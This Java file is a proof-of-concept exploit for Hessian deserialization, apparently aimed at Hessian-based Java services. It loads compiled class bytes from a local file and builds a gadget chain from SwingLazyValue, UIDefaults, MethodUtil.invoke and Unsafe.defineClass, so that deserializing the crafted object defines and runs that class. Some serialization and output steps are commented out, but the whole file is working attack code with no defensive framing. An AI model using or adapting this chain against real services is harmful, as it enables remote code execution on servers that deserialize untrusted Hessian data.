import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.caucho.hessian.io.SerializerFactory;
import org.apache.tomcat.util.buf.HexUtils;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;

public class Poc {
    static SerializerFactory serializerFactory = new SerializerFactory();

    public static void main(String[] args) throws Exception {

        FileInputStream fileInputStream = new FileInputStream("D://tmp//classes//CalcAbs.class");
        byte[] bcode = new byte[fileInputStream.available()];
        //bcode = Calc.genPayloadForWin();
        fileInputStream.read(bcode);
//        System.out.println("bcode:" + Base64.getEncoder().encodeToString(bcode));

        serializerFactory.setAllowNonSerializable(true);

        Method invoke = sun.reflect.misc.MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
        Method defineClass = sun.misc.Unsafe.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);
        Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        Object unsafe = f.get(null);
        Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{"Calc", bcode, 0, bcode.length, null, null}}};

        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", ags);
        SwingLazyValue swingLazyValue1 = new SwingLazyValue("Calc", null, new Object[0]);

        Object[] keyValueList = new Object[]{"abc", swingLazyValue};
        Object[] keyValueList1 = new Object[]{"ccc", swingLazyValue1};

        UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
//        UIDefaults uiDefaults2 = new UIDefaults(keyValueList);
        UIDefaults uiDefaults3 = new UIDefaults(keyValueList1);
//        UIDefaults uiDefaults4 = new UIDefaults(keyValueList1);

        Hashtable<Object, Object> hashtable1 = new Hashtable<>();
//        Hashtable<Object, Object> hashtable2 = new Hashtable<>();
        Hashtable<Object, Object> hashtable3 = new Hashtable<>();
//        Hashtable<Object, Object> hashtable4 = new Hashtable<>();

        hashtable1.put(uiDefaults1, uiDefaults1);
//        hashtable2.put("a", uiDefaults2);
        hashtable3.put(uiDefaults3, uiDefaults3);
//        hashtable4.put("b", uiDefaults4);
        HashMap<Object, Object> map = new HashMap<>();
        map.put(uiDefaults3, 1);
        map.put(hashtable3, 1);


//        HashMap<Object, Object> s = new HashMap<>();
//        setFieldValue(s, "size", 4);
//        Class<?> nodeC;
//        try {
//            nodeC = Class.forName("java.util.HashMap$Node");
//        } catch (ClassNotFoundException e) {
//            nodeC = Class.forName("java.util.HashMap$Entry");
//        }
//        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
//        nodeCons.setAccessible(true);
//
//        Object tbl = Array.newInstance(nodeC, 4);
//        Array.set(tbl, 0, nodeCons.newInstance(0, hashtable1, hashtable1, null));
//        Array.set(tbl, 1, nodeCons.newInstance(0, hashtable2, hashtable2, null));
//        Array.set(tbl, 2, nodeCons.newInstance(0, hashtable3, hashtable3, null));
//        Array.set(tbl, 3, nodeCons.newInstance(0, hashtable4, hashtable4, null));
//        setFieldValue(s, "table", tbl);
//        byte[] bytes = serObj(s);
//
//        System.out.println("63020048000464646464"+HexUtils.toHexString(bytes));
//        des(bytes);
    }

    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] serObj(HashMap s) throws Exception {

        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(btout);
        hessianOutput.setSerializerFactory(serializerFactory);
        hessianOutput.writeObject(s);
        hessianOutput.close();
        return btout.toByteArray();
    }

    public static Object des(byte[] bytes) throws IOException {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        try {
            return hessianInput.readObject();
        } catch (EOFException e) {
            throw new IOException("Unexpected end of file while reading object", e);
        }
    }
}